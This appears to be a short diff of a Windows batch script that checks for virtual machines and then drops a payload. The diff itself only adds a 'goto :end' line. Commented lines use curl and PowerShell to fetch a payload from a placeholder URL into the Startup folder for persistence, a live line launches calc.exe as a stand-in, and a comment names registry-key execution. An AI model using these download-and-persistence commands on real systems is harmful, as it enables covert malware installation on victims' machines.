@@ -76,6 +76,7 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 ::        curl.exe -kL <urltopayload> -o %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat
 ::        powershell.exe -c Invoke-WebRequest -uri <urltopayload> -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat"
 powershell.exe -c calc.exe
+goto :end
 
 ::    Download script to Temp and execute with Registry Key
 
